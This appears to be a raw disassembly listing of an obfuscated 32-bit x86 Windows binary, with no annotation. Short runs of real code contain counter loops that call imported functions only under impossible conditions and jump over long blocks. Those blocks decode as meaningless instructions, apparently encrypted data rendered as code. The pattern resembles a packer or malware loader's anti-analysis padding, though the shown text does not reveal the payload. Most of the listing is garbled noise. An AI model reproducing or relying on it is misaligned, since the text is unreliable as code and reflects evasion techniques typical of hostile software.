  408312:	add    BYTE PTR [ebx+0x8b0845],cl
  408318:	mov    ecx,DWORD PTR ds:0x40d64c
  40831e:	add    DWORD PTR [eax],ecx
  408320:	pop    esi
  408321:	pop    ebp
  408322:	ret    0x8
  408325:	push   ebp
  408326:	mov    ebp,esp
  408328:	sub    esp,0x58
  40832b:	and    DWORD PTR ds:0x4245ca,0x0
  408335:	jmp    0x408347
  40833a:	mov    ecx,DWORD PTR ds:0x4245ca
  408340:	inc    ecx
  408341:	mov    DWORD PTR ds:0x4245ca,ecx
  408347:	cmp    DWORD PTR ds:0x4245ca,0x1a
  40834e:	jae    0x408391
  408354:	cmp    DWORD PTR ds:0x4245ca,0xb
  40835b:	jne    0x40836c
  408361:	push   0x561f
  408366:	call   DWORD PTR ds:0x40d36c
  40836c:	cmp    DWORD PTR ds:0x4245ca,0xa
  408373:	jne    0x408386
  408379:	mov    ecx,DWORD PTR ds:0x4245ca
  40837f:	inc    ecx
  408380:	mov    DWORD PTR ds:0x4245ca,ecx
  408386:	jmp    0x40833a
  40838b:	inc    DWORD PTR ds:0x412370
  408391:	mov    ecx,DWORD PTR [ebp+0x8]
  408394:	and    DWORD PTR ds:0x417e55,0x0
  40839e:	jmp    0x4083b1
  4083a3:	xor    eax,eax
  4083a5:	or     eax,DWORD PTR ds:0x417e55
  4083ab:	inc    eax
  4083ac:	mov    ds:0x417e55,eax
  4083b1:	cmp    DWORD PTR ds:0x417e55,0x1f
  4083b8:	jae    0x4083df
  4083be:	cmp    DWORD PTR ds:0x417e55,0x21
  4083c5:	jne    0x4083d4
  4083cb:	push   DWORD PTR [ebp-0x14]
  4083ce:	call   DWORD PTR ds:0x40d008
  4083d4:	jmp    0x4083a3
  4083d9:	sub    DWORD PTR ds:0x4245ca,edi
  4083df:	mov    eax,0x8a43
  4083e4:	sub    DWORD PTR ds:0x415101,0x2da0
  4083ee:	jmp    0x408517
  4083f3:	dec    ecx
  4083f4:	pushf  
  4083f5:	push   esp
  4083f6:	in     eax,dx
  4083f7:	imul   esp,ebp,0x9f63b859
  4083fd:	mov    DWORD PTR [edx+ebx*2+0x619a2a07],ebp
  408404:	adc    al,0x7e
  408406:	jle    0x408412
  408408:	jg     0x408488
  40840a:	jle    0x408454
  40840c:	int3   
  40840d:	push   eax
  40840e:	popf   
  40840f:	push   eax
  408410:	(bad)  
  408411:	loope  0x4083cd
  408413:	dec    eax
  408414:	sbb    DWORD PTR [eax-0x75521bd2],ebp
  40841a:	sbb    bh,BYTE PTR [esi+ebp*1-0x483ae03b]
  408421:	daa    
  408422:	in     al,0x30
  408424:	lods   al,BYTE PTR ds:[esi]
  408425:	jecxz  0x408468
  408427:	or     DWORD PTR [esi+0x14],esp
  40842a:	fld    TBYTE PTR [edi+0xb]
  40842d:	xchg   DWORD PTR [edx+edx*1],ebp
  408430:	loopne 0x408439
  408432:	cdq    
  408433:	cli    
  408434:	pop    ebp
  408435:	mov    bh,0x56
  408437:	test   edx,ebx
  408439:	sub    ah,BYTE PTR [esi+0x1452137d]
  40843f:	popa   
  408440:	mov    ss,WORD PTR [ebx+0x5568c38d]
  408446:	xchg   esp,eax
  408447:	jno    0x4083dc
  408449:	mov    edx,0x4eeeabdd
  40844e:	sub    al,0xe6
  408450:	xor    BYTE PTR [ebp+0x3e],bl
  408453:	add    ah,ah
  408455:	xchg   esi,eax
  408456:	mov    bh,0xa4
  408458:	mov    ch,0x8f
  40845a:	xchg   BYTE PTR [ecx],ch
  40845c:	leave  
  40845d:	dec    esp
  40845e:	xchg   ecx,eax
  40845f:	ja     0x408448
  408461:	lds    ebp,FWORD PTR [eax+0x49]
  408464:	nop
  408465:	push   edx
  408466:	repnz loopne 0x4083ec
  408469:	mov    ch,0xc2
  40846b:	mov    bl,0xc1
  40846d:	and    DWORD PTR [esi],edx
  40846f:	jle    0x408448
  408471:	imul   BYTE PTR [ebp+0x2894a5e7]
  408477:	in     eax,0xae
  408479:	mov    eax,0xf9a6b38f
  40847e:	loope  0x408485
  408480:	sub    BYTE PTR [ecx-0xf],0x5d
  408484:	and    DWORD PTR [ebp+0xec9e623],0x37
  40848b:	pop    edi
  40848c:	xchg   edi,eax
  40848d:	push   ss
  40848e:	push   ds
  40848f:	scas   eax,DWORD PTR es:[edi]
  408490:	dec    ecx
  408491:	mov    ds:0x76f61c80,eax
  408496:	mov    dh,0xda
  408498:	popf   
  408499:	cld    
  40849a:	xchg   ah,bh
  40849c:	int3   
  40849d:	cmp    eax,0x42ffb7e3
  4084a2:	push   ecx
  4084a3:	les    edx,FWORD PTR [edi]
  4084a5:	adc    eax,0x1d2942f
  4084aa:	inc    esi
  4084ab:	test   dh,bl
  4084ad:	data16 scas al,BYTE PTR es:[edi]
  4084af:	mov    BYTE PTR [eax],ch
  4084b1:	sub    DWORD PTR [ecx+0x7d],0xffffffc3
  4084b5:	jnp    0x408527
  4084b7:	out    dx,al
  4084b8:	pushf  
  4084b9:	sub    eax,DWORD PTR [ebx]
  4084bb:	aad    0x23
  4084bd:	pop    ebx
  4084be:	fnstsw WORD PTR [eax+eiz*4]
  4084c1:	push   ecx
  4084c2:	loop   0x40844f
  4084c4:	cwde   
  4084c5:	xchg   ecx,eax
  4084c6:	imul   eax,DWORD PTR [esi+ecx*8],0x65
  4084ca:	mov    dl,0x60
  4084cc:	pop    ds
  4084cd:	shr    DWORD PTR [edi],cl
  4084cf:	clc    
  4084d0:	dec    ebp
  4084d1:	jge    0x40851d
  4084d3:	or     edx,DWORD PTR [edx]
  4084d5:	(bad)  
  4084d6:	mov    fs,WORD PTR [edi-0x28]
  4084d9:	ss inc eax
  4084db:	push   ebx
  4084dc:	jl     0x408469
  4084de:	sub    al,0x75
  4084e0:	push   ebx
  4084e1:	mov    ebp,0xea6e08f3
  4084e6:	jb     0x4084bb
  4084e8:	push   0xffffffa1
  4084ea:	xor    al,0x9a
  4084ec:	pop    es
  4084ed:	repnz sub eax,0x70be257d
  4084f3:	popa   
  4084f4:	dec    ecx
  4084f5:	cmp    BYTE PTR [esi-0x59],ch
  4084f8:	or     eax,0x1c17d0ae
  4084fd:	inc    edx
  4084fe:	mov    esp,0xe94745b2
  408503:	arpl   WORD PTR [ecx-0x78],bp
  408506:	cmp    DWORD PTR [edx+edi*8],edi
  408509:	pop    edi
  40850a:	out    0x86,eax
  40850c:	jmp    0x40855c
  40850e:	sbb    al,0xe3
  408510:	xchg   esp,eax
  408511:	push   edi
  408512:	ror    BYTE PTR ds:0x66657bb1,0x33
  408519:	inc    ecx
  40851a:	and    BYTE PTR [ecx+0x3b0a],bh
  408520:	not    DWORD PTR ds:0x41abce
  408526:	add    ax,cx
  408529:	mov    ecx,DWORD PTR ds:0x417e49
  40852f:	or     ecx,DWORD PTR ds:0x412374
  408535:	mov    DWORD PTR ds:0x417e49,ecx
  40853b:	jmp    0x408664
  408540:	sub    cl,BYTE PTR [ebp-0x31]
  408543:	xchg   esp,eax
  408544:	jns    0x4084da
  408546:	jns    0x408589
  408548:	or     eax,0x8726a896
  40854d:	cdq    
  40854e:	enter  0x7db0,0x2a
  408552:	jle    0x4085d2
  408554:	or     bh,BYTE PTR [edi+0x7e]
  408557:	jle    0x4084dd
  408559:	lods   al,BYTE PTR ds:[esi]
  40855a:	ror    dh,1
  40855c:	int    0x36
  40855e:	pop    ss
  40855f:	push   ss
  408560:	dec    edx
  408561:	pop    eax
  408562:	mov    al,0x50
  408564:	jbe    0x4084f8
  408566:	add    edi,esi
  408568:	mov    al,ds:0x179df451
  40856d:	sbb    bh,ch
  40856f:	imul   esp,DWORD PTR [ebx],0x9
  408572:	xor    DWORD PTR [ecx-0x76],esp
  408575:	fs xchg al,bh
  408578:	xchg   ebx,eax
  408579:	loop   0x4085cc
  40857b:	(bad)  [ebp+0x21]
  40857e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40857f:	and    cl,cl
  408581:	ret    
  408582:	push   ecx
  408583:	mov    ebx,0xb7c1d268
  408588:	pop    ds
  408589:	jecxz  0x408583
  40858b:	lahf   
  40858c:	ds push ecx
  40858e:	pop    ebp
  40858f:	aam    0x13
  408591:	fsub   DWORD PTR [ecx-0x3aad0230]
  408597:	jns    0x408574
  408599:	lods   al,BYTE PTR ds:[esi]
  40859a:	pop    esp
  40859b:	nop
  40859c:	and    ah,dh
  40859e:	sub    eax,0xb74dde6b
  4085a3:	inc    esi
  4085a4:	out    dx,eax
  4085a5:	jmp    0x4fc4f819
  4085aa:	sub    al,0x11
  4085ac:	pop    DWORD PTR [ecx+0x1e]
  4085af:	mov    esi,cr6
  4085b2:	sar    dh,0x92
  4085b5:	adc    eax,edx
  4085b7:	out    0xdc,eax
  4085b9:	pop    ds
  4085ba:	shl    BYTE PTR [edx-0x23],1
  4085bd:	adc    BYTE PTR [eax+0x19554840],bh
  4085c3:	in     eax,0xd
  4085c5:	xchg   ebx,eax
  4085c6:	cdq    
  4085c7:	or     ecx,DWORD PTR [eax+edi*4]
  4085ca:	sub    al,dh
  4085cc:	shr    BYTE PTR [esi],cl
  4085ce:	sti    
  4085cf:	xchg   edx,eax
  4085d0:	mov    cl,0xd8
  4085d2:	or     esi,DWORD PTR [edx+0x64c337c6]
  4085d8:	dec    ebp
  4085d9:	xchg   esi,eax
  4085da:	lock xchg ecx,eax
  4085dc:	mov    al,0x22
  4085de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085df:	data16 into 
  4085e1:	mov    ds:0xf63186f9,eax
  4085e6:	push   0xffffffd3
  4085e8:	and    dl,BYTE PTR [ebx]
  4085ea:	push   0x37
  4085ec:	inc    eax
  4085ed:	sub    BYTE PTR [ecx],0xb1
  4085f0:	pop    ebx
  4085f1:	dec    edi
  4085f2:	fs jo  0x408636
  4085f5:	test   al,0x1e
  4085f7:	mov    ch,0xca
  4085f9:	sbb    ebp,ebx
  4085fb:	iret   
  4085fc:	std    
  4085fd:	dec    edx
  4085fe:	fidiv  WORD PTR [edx]
  408600:	ficom  WORD PTR [edi-0x3c]
  408603:	daa    
  408604:	stos   BYTE PTR es:[edi],al
  408605:	test   al,0x3a
  408607:	sahf   
  408608:	pushf  
  408609:	jge    0x408614
  40860b:	cmp    BYTE PTR [esi+0x24],0x1d
  40860f:	(bad)  
  408610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408611:	jge    0x4085c8
  408613:	mov    eax,ds:0x13b0f66c
  408618:	mov    ds:0xe0d5921,al
  40861d:	dec    ah
  40861f:	ss push es
  408621:	inc    ecx
  408622:	dec    ebp
  408623:	push   0x1e1945ca
  408628:	pop    edx
  408629:	sahf   
  40862a:	(bad)  
  40862b:	and    al,0x9d
  40862d:	hlt    
  40862e:	jnp    0x408653
  408630:	je     0x408616
  408632:	add    dl,BYTE PTR [ebp-0x37dceeb5]
  408638:	repnz sub bh,BYTE PTR [edx+0x1181a481]
  40863f:	push   ss
  408640:	ror    BYTE PTR [ebx],0x8e
  408643:	(bad)  
  408644:	and    eax,0xb134569c
  408649:	dec    esp
  40864a:	rcl    BYTE PTR [edx],cl
  40864c:	adc    al,ah
  40864e:	in     eax,0xdb
  408650:	ja     0x408604
  408652:	mov    edi,0x51c37ef5
  408657:	and    al,0x8f
  408659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40865a:	addr16 gs pop esi
  40865d:	push   ss
  40865e:	sti    
  40865f:	mov    dh,0xa7
  408661:	adc    cl,al
  408663:	lods   eax,DWORD PTR ds:[esi]
  408664:	movzx  eax,ax
  408667:	add    ecx,DWORD PTR ds:0x417e49
  40866d:	mov    DWORD PTR [ebp-0xc],eax
  408670:	mov    BYTE PTR [ebp-0x1],0x7f
  408674:	lea    eax,[ebp-0x1]
  408677:	and    DWORD PTR ds:0x4245c6,edx
  40867d:	mov    DWORD PTR [ebp-0x10],eax
  408680:	mov    DWORD PTR ds:0x41510d,0x1a
  40868a:	cmp    DWORD PTR ds:0x41510d,0x0
  408691:	je     0x4086bf
  408697:	cmp    DWORD PTR ds:0x41510d,0x25
  40869e:	jne    0x4086ad
  4086a4:	push   DWORD PTR [ebp-0x18]
  4086a7:	call   DWORD PTR ds:0x40d370
  4086ad:	mov    ecx,DWORD PTR ds:0x41510d
  4086b3:	dec    ecx
  4086b4:	mov    DWORD PTR ds:0x41510d,ecx
  4086ba:	jmp    0x40868a
  4086bf:	mov    al,BYTE PTR [ebp-0x1]
  4086c2:	and    DWORD PTR ds:0x4150fd,0x0
  4086cc:	mov    ecx,DWORD PTR ds:0x4150fd
  4086d2:	inc    ecx
  4086d3:	mov    DWORD PTR ds:0x4150fd,ecx
  4086d9:	cmp    DWORD PTR ds:0x4150fd,0x11
  4086e0:	jne    0x4086f1
  4086e6:	push   0x41ad87
  4086eb:	call   DWORD PTR ds:0x40d1e4
  4086f1:	cmp    DWORD PTR ds:0x4150fd,0x10
  4086f8:	jne    0x40870b
  4086fe:	mov    ecx,DWORD PTR ds:0x4150fd
  408704:	inc    ecx
  408705:	mov    DWORD PTR ds:0x4150fd,ecx
  40870b:	cmp    DWORD PTR ds:0x4150fd,0x1f
  408712:	jb     0x4086cc
  408718:	neg    ecx
  40871a:	mov    ecx,DWORD PTR [ebp-0x10]
  40871d:	xor    al,0x4a
  40871f:	or     DWORD PTR ds:0x41abe2,0x415105
  408729:	sub    al,0x34
  40872b:	mov    BYTE PTR [ecx],al
  40872d:	xor    ecx,ecx
  40872f:	jmp    0x408858
  408734:	adc    DWORD PTR [ebx+0xc],ebx
  408737:	(bad)  
  408738:	fs pop ecx
  40873a:	jmp    0x44b4d3b8
  40873f:	(bad)  
  408741:	mov    ah,0xb0
  408743:	or     eax,0x7e7e2b09
  408748:	or     bh,BYTE PTR [edi+0x7e]
  40874b:	jle    0x40873f
  40874d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40874e:	or     BYTE PTR [esi+0xa3232bd],al
  408754:	jecxz  0x4087a3
  408756:	and    al,0x83
  408758:	xor    dh,ah
  40875a:	outs   dx,DWORD PTR ds:[esi]
  40875b:	adc    al,0x23
  40875d:	push   esp
  40875e:	clc    
  40875f:	mov    ds:0x28fb4065,eax
  408764:	loope  0x40876f
  408766:	stos   BYTE PTR es:[edi],al
  408767:	push   ebp
  408768:	jmp    0x4739c89f
  40876d:	je     0x408718
  40876f:	(bad)  
  408770:	xlat   BYTE PTR ds:[ebx]
  408771:	out    0x8c,eax
  408773:	sbb    ebx,ecx
  408775:	mov    al,0x5a
  408777:	sbb    ecx,DWORD PTR [edx+0x74f69f05]
  40877d:	fwait
  40877e:	cs dec ecx
  408780:	mov    dh,0x25
  408782:	out    dx,eax
  408783:	cs pushf 
  408785:	sbb    eax,0x41e140a9
  40878a:	out    dx,al
  40878b:	push   ss
  40878c:	xchg   esi,eax
  40878d:	xor    DWORD PTR [ebp-0x60002cc4],esp
  408793:	mov    edx,0x5cd41b62
  408798:	mov    DWORD PTR [ecx-0x6ead3361],esp
  40879e:	(bad)  [eax]
  4087a0:	dec    esp
  4087a1:	out    0xd7,al
  4087a3:	pop    edx
  4087a4:	push   es
  4087a5:	inc    esi
  4087a6:	out    0x54,eax
  4087a8:	mov    esp,0x55523c1e
  4087ad:	and    DWORD PTR [edi],esi
  4087af:	xor    ah,BYTE PTR [esi]
  4087b1:	fcomp  st(2)
  4087b3:	sbb    bl,ah
  4087b5:	test   eax,0x642574c0
  4087ba:	outs   dx,DWORD PTR ds:[esi]
  4087bb:	mov    dh,0x7d
  4087bd:	pop    ebx
  4087be:	ds jmp 0x408780
  4087c1:	frstor [ebp+0x0]
  4087c4:	gs cmp eax,0x7e328b87
  4087ca:	cmp    DWORD PTR [edx+esi*2+0x4b0fc018],ebp
  4087d1:	and    DWORD PTR [edi-0x45b8a793],ebp
  4087d7:	nop
  4087d8:	icebp  
  4087d9:	outs   dx,DWORD PTR ds:[esi]
  4087da:	dec    edi
  4087db:	(bad)  
  4087dc:	push   ebx
  4087dd:	pop    ss
  4087de:	aad    0xf7
  4087e0:	ins    BYTE PTR es:[edi],dx
  4087e1:	push   edx
  4087e2:	mov    BYTE PTR [edi+esi*2-0x51],0xfc
  4087e7:	jnp    0x4087a0
  4087e9:	daa    
  4087ea:	and    DWORD PTR [ebp+ebp*2+0x15],ebx
  4087ee:	(bad)
  4087f1:	sub    eax,0xd3f272c0
  4087f6:	retf   0xc8c8
  4087f9:	movq   QWORD PTR [eax-0x4bcffe38],mm6
  408800:	std    
  408801:	push   eax
  408802:	add    al,BYTE PTR [esi-0x23]
  408805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408806:	mov    ebp,0xe23a5f9b
  40880b:	xor    al,0xd9
  40880d:	cli    
  40880e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40880f:	lock popf 
  408811:	fcomp  DWORD PTR [eax]
  408813:	loopne 0x4087a1
  408815:	mov    esi,0xe4a8d8f1
  40881a:	movntq QWORD PTR [edi-0x43],mm0
  40881e:	mov    dl,0xbf
  408820:	test   eax,0x864f7127
  408825:	mov    BYTE PTR [edx+ebp*2],al
  408828:	test   al,0x43
  40882a:	pop    edx
  40882b:	repz int 0x8
  40882e:	sbb    eax,0x1a288a5
  408833:	aas    
  408834:	jns    0x408801
  408836:	xor    eax,0x922fa25
  40883b:	pop    es
  40883c:	or     dh,BYTE PTR [ebp+0x2d]
  40883f:	ficomp WORD PTR [edx+0x183585c3]
  408845:	rcr    DWORD PTR [edx],cl
  408847:	sub    DWORD PTR [ebp-0x4ab24b2a],eax
  40884d:	fsubrp st(2),st
  40884f:	pop    ebp
  408850:	ret    
  408851:	or     ch,dh
  408853:	inc    edi
  408854:	inc    ecx
  408855:	shl    BYTE PTR [edi+0x2a],cl
  408858:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40885f:	adc    DWORD PTR ds:0x412370,0x1786
  408869:	mov    DWORD PTR [ebp-0x10],0xf89c853b
  408870:	mov    eax,DWORD PTR [ebp-0x8]
  408873:	xor    ecx,ecx
  408875:	add    ecx,DWORD PTR ds:0x417e59
  40887b:	sbb    DWORD PTR ds:0x41abde,ecx
  408881:	mov    ecx,0x7510859
  408886:	add    DWORD PTR ds:0x41abe6,0x417e51
  408890:	push   esi
  408891:	and    DWORD PTR ds:0x417e59,0x0
  40889b:	mov    esi,DWORD PTR ds:0x417e59
  4088a1:	inc    esi
  4088a2:	mov    DWORD PTR ds:0x417e59,esi
  4088a8:	cmp    DWORD PTR ds:0x417e59,0x9
  4088af:	jne    0x4088f1
  4088b5:	push   0x41ad06
  4088ba:	push   DWORD PTR [ebp-0x10]
  4088bd:	push   DWORD PTR [ebp-0x14]
  4088c0:	push   0x6f38
  4088c5:	push   0x208a
  4088ca:	push   0x8fdb
  4088cf:	push   0x1d69
  4088d4:	push   DWORD PTR [ebp-0x20]
  4088d7:	push   0x57cc
  4088dc:	push   DWORD PTR [ebp-0x10]
  4088df:	push   DWORD PTR [ebp-0x28]
  4088e2:	push   DWORD PTR [ebp-0x24]
  4088e5:	push   DWORD PTR [ebp-0x28]
  4088e8:	push   DWORD PTR [ebp-0x1c]
  4088eb:	call   DWORD PTR ds:0x40d374
  4088f1:	cmp    DWORD PTR ds:0x417e59,0x8
  4088f8:	jne    0x40890d
  4088fe:	xor    esi,esi
  408900:	add    esi,DWORD PTR ds:0x417e59
  408906:	inc    esi
  408907:	mov    DWORD PTR ds:0x417e59,esi
  40890d:	cmp    DWORD PTR ds:0x417e59,0x13
  408914:	jb     0x40889b
  40891a:	xor    eax,ecx
  40891c:	mov    esi,0x32729f
  408921:	add    eax,esi
  408923:	jmp    0x408930
  408928:	mov    dl,BYTE PTR [ebp-0x1]
  40892b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40892f:	inc    eax
  408930:	cmp    eax,0x40
  408933:	jb     0x408928
  408939:	mov    edx,DWORD PTR [ebp-0x8]
  40893c:	mov    eax,DWORD PTR [ebp-0xc]
  40893f:	jmp    0x408a68
  408944:	sub    eax,0xb98f82f6
  408949:	fwait
  40894a:	and    DWORD PTR [eax+eax*1-0x4528be99],edx
  408951:	lock test al,0x78
  408954:	add    eax,0xa7e7e28
  408959:	jg     0x4089d9
  40895b:	jle    0x4089c8
  40895d:	into   
  40895e:	xchg   esp,eax
  40895f:	jb     0x408939
  408961:	ja     0x408935
  408963:	mov    esp,0x8e0519bf
  408968:	call   0xcb62c2b5
  40896d:	ret    
  40896e:	jl     0x408977
  408970:	cmp    bh,BYTE PTR [ebp+0x69953f7d]
  408976:	pop    ebx
  408977:	jns    0x408976
  408979:	cli    
  40897a:	and    ebx,esi
  40897c:	fstp   DWORD PTR [edx-0x2d]
  40897f:	cs pop ecx
  408981:	popf   
  408982:	mov    edx,0x19d19134
  408987:	jp     0x408a06
  408989:	js     0x4089b6
  40898b:	arpl   WORD PTR [edx+esi*8+0x2cdc0a0e],bx
  408992:	sbb    BYTE PTR [ebp+0x1f],dl
  408995:	loop   0x4089e9
  408997:	push   ss
  408998:	fisttp DWORD PTR [ebp-0x5c]
  40899b:	xchg   BYTE PTR [edx-0x76],bl
  40899e:	stos   BYTE PTR es:[edi],al
  40899f:	or     eax,0x61a66ef3
  4089a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089a5:	or     eax,0x29d08ef1
  4089aa:	aas    
  4089ab:	hlt    
  4089ac:	jmp    0x40896c
  4089ae:	int    0xe1
  4089b0:	mov    esi,0x46a625a1
  4089b5:	test   DWORD PTR [ebx-0x4d],ecx
  4089b8:	mov    DWORD PTR [esi-0x4c],0x70b70409
  4089bf:	(bad)  
  4089c0:	mov    al,ds:0xf66f2829
  4089c5:	loop   0x4089ed
  4089c7:	cmp    DWORD PTR [edi+edi*8-0x1],0x27c30e36
  4089cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089d0:	or     DWORD PTR [edx+ebp*2-0x25],0xffffffb6
  4089d5:	mov    ecx,esi
  4089d7:	sub    eax,0x4f326e0c
  4089dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089dd:	gs cwde 
  4089df:	sub    edi,DWORD PTR [edx-0x76e8609e]
  4089e5:	clc    
  4089e6:	test   BYTE PTR [edi],bl
  4089e8:	(bad)  
  4089e9:	jb     0x4089d2
  4089eb:	fidiv  WORD PTR ds:0x25efe270
  4089f1:	or     DWORD PTR [eax+0x2],ebx
  4089f4:	inc    ebp
  4089f5:	mov    ecx,0x1ee2fef0
  4089fa:	(bad)  
  4089fc:	pop    ebx
  4089fd:	clc    
  4089fe:	arpl   WORD PTR [edx+0x58],si
  408a01:	adc    eax,DWORD PTR [esi+0x8]
  408a04:	pop    ecx
  408a05:	dec    esp
  408a06:	jl     0x4089d8
  408a08:	cvtps2pd xmm7,QWORD PTR [esi+0x6dfc3a37]
  408a0f:	pop    ecx
  408a10:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a12:	add    dh,BYTE PTR [edi]
  408a14:	ret    
  408a15:	rol    al,cl
  408a17:	lock mov dh,0xd2
  408a1a:	mov    BYTE PTR [eax+0x5b],ch
  408a1d:	cmc    
  408a1e:	fst    DWORD PTR [edi+0x65a93445]
  408a24:	mov    WORD PTR ss:[ecx+ecx*1],ss
  408a28:	cwde   
  408a29:	cmp    ah,BYTE PTR [eax+ecx*4]
  408a2c:	xlat   BYTE PTR ds:[ebx]
  408a2d:	es ss push edx
  408a30:	in     al,dx
  408a31:	jg     0x4089df
  408a33:	test   DWORD PTR [ecx+0x537e482],ebx
  408a39:	gs xchg edi,eax
  408a3b:	cmp    eax,0x813a3bd0
  408a40:	retf   
  408a41:	loop   0x4089d5
  408a43:	int3   
  408a44:	pop    ebp
  408a45:	mov    bh,0xcc
  408a47:	mov    bl,dh
  408a49:	ret    
  408a4a:	cmp    BYTE PTR [eax-0x59],dh
  408a4d:	mov    ebx,0x77fa1e68
  408a52:	add    BYTE PTR ds:0x71e106b8,dh
  408a58:	sub    edi,edi
  408a5a:	mov    esp,0xccc8205c
  408a5f:	adc    esi,DWORD PTR [edi+0x60]
  408a62:	sub    BYTE PTR [ebp-0x21a99288],dh
  408a68:	xor    edx,ecx
  408a6a:	add    edx,esi
  408a6c:	cmp    edx,eax
  408a6e:	je     0x408d06
  408a74:	jmp    0x408b9d
  408a79:	xor    ecx,DWORD PTR [edx+ebx*1-0x14]
  408a7d:	cdq    
  408a7e:	js     0x408a69
  408a80:	popa   
  408a81:	cmp    ax,0xba8d
  408a85:	arpl   sp,bx
  408a87:	pushf  
  408a88:	daa    
  408a89:	adc    DWORD PTR [ecx],ebp
  408a8b:	jle    0x408b0b
  408a8d:	or     bh,BYTE PTR [edi+0x7e]
  408a90:	jle    0x408a97
  408a92:	repz sbb BYTE PTR [ebp+ebx*8-0x4a62d8ac],ah
  408a9a:	les    edx,FWORD PTR gs:[esp+ebx*8]
  408a9e:	dec    esi
  408a9f:	add    edi,DWORD PTR [esi+0x73]
  408aa2:	dec    eax
  408aa3:	shl    DWORD PTR [eax+0x27a3132],cl
  408aa9:	inc    ebx
  408aaa:	aaa    
  408aab:	mov    eax,0xa677c9bf
  408ab0:	fstp   TBYTE PTR [esi-0x1b566a5c]
  408ab6:	retf   0x234b
  408ab9:	(bad)  
  408abb:	std    
  408abc:	fwait
  408abd:	ins    BYTE PTR es:[edi],dx
  408abe:	int3   
  408abf:	fucomp st(7)
  408ac1:	lahf   
  408ac2:	mov    ds:0x12e28e21,al
  408ac7:	int    0x15
  408ac9:	mov    edx,0xeedc82a7
  408ace:	test   esi,ebp
  408ad0:	push   esp
  408ad1:	xchg   ebp,eax
  408ad2:	inc    esp
  408ad3:	(bad)
  408ad6:	pop    esp
  408ad7:	jbe    0x408aff
  408ad9:	shl    BYTE PTR [ecx+0x15],cl
  408adc:	push   es
  408add:	cmp    eax,esp
  408adf:	cmp    DWORD PTR [edx],ecx
  408ae1:	mov    dh,0xdd
  408ae3:	cmp    DWORD PTR [edx],esi
  408ae5:	inc    ebp
  408ae6:	cmp    al,0x33
  408ae8:	and    DWORD PTR [edx+esi*1+0x57],esi
  408aec:	xchg   DWORD PTR [ebp+edi*2-0x6b644c9c],ecx
  408af3:	pusha  
  408af4:	cli    
  408af5:	inc    ebp
  408af6:	adc    DWORD PTR [esi+ebx*1],0xffffffac
  408afa:	sbb    ch,dh
  408afc:	leave  
  408afd:	fs repnz push ss
  408b00:	clc    
  408b01:	movnti DWORD PTR [ebp-0x7],ecx
  408b05:	mov    ah,0x7c
  408b07:	loopne 0x408b00
  408b09:	cwde   
  408b0a:	xor    BYTE PTR [ebx+edx*2],ah
  408b0d:	(bad)  
  408b0f:	or     DWORD PTR [edx],ebp
  408b11:	out    dx,al
  408b12:	(bad)  
  408b13:	(bad)  
  408b14:	xor    eax,0xd9d35a6f
  408b19:	xchg   DWORD PTR [eax],ebx
  408b1b:	popa   
  408b1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b1d:	shl    ecx,1
  408b1f:	into   
  408b20:	shr    DWORD PTR [eax],cl
  408b22:	aas    
  408b23:	xchg   ecx,eax
  408b24:	sti    
  408b25:	aaa    
  408b26:	idiv   ebx
  408b28:	mov    edi,0xff9ed3e4
  408b2d:	push   ebx
  408b2e:	and    BYTE PTR [ebp-0x30],cl
  408b31:	data16 arpl WORD PTR [ebx+0x6b7596bb],ax
  408b38:	adc    ah,BYTE PTR [ebx]
  408b3a:	sub    BYTE PTR [ebp+0x1056b8cb],dl
  408b40:	pop    edx
  408b41:	jecxz  0x408b50
  408b43:	ja     0x408b94
  408b45:	mov    bl,0x24
  408b47:	add    DWORD PTR ds:0x397866ff,ebx
  408b4d:	int    0x73
  408b4f:	mov    bl,0xf8
  408b51:	out    0xa2,al
  408b53:	je     0x408b73
  408b55:	xchg   ecx,eax
  408b56:	mov    al,0xc6
  408b58:	ss jae 0x408b73
  408b5b:	push   edx
  408b5c:	dec    ebx
  408b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b5e:	(bad)  
  408b60:	or     al,0xea
  408b62:	jbe    0x408b95
  408b64:	in     al,0x24
  408b66:	push   edi
  408b67:	sbb    ch,dl
  408b69:	jle    0x408bbc
  408b6b:	loopne 0x408af9
  408b6d:	clc    
  408b6e:	xor    BYTE PTR [esi+0x1e55c541],al
  408b74:	xchg   ebp,eax
  408b75:	repnz adc esi,DWORD PTR [ecx-0x2c5826b5]
  408b7c:	sub    ebp,DWORD PTR [ebx+0x3778b11d]
  408b82:	(bad)  
  408b83:	and    BYTE PTR [ebp-0x21],dh
  408b86:	out    0xf9,eax
  408b88:	retf   0xb597
  408b8b:	shl    BYTE PTR [edi],cl
  408b8d:	icebp  
  408b8e:	cmp    BYTE PTR [eax-0x4b],dl
  408b91:	jns    0x408bc1
  408b93:	ret    0x50da
  408b96:	shr    BYTE PTR [ebp-0x64d9d8e5],1
  408b9c:	rcl    BYTE PTR [ebx+0x57],1
  408b9f:	mov    edi,DWORD PTR [ebp+0x8]
  408ba2:	mov    eax,0x8a43
  408ba7:	xor    ax,WORD PTR [edi+edx*4+0x2]
  408bac:	mov    edi,0x3b0a
  408bb1:	add    ax,di
  408bb4:	movzx  eax,ax
  408bb7:	mov    DWORD PTR [ebp-0x14],eax
  408bba:	mov    eax,DWORD PTR [ebp+0x8]
  408bbd:	jmp    0x408ce6
  408bc2:	(bad)  
  408bc3:	fcom   DWORD PTR [edx+eax*8]
  408bc6:	sub    dl,ah
  408bc8:	clc    
  408bc9:	fcomp  DWORD PTR [ebx-0x6ec9643]
  408bcf:	sbb    eax,ebp
  408bd1:	sbb    al,0x2d
  408bd3:	cs jle 0x408c54
  408bd6:	or     bh,BYTE PTR [edi+0x7e]
  408bd9:	jle    0x408c29
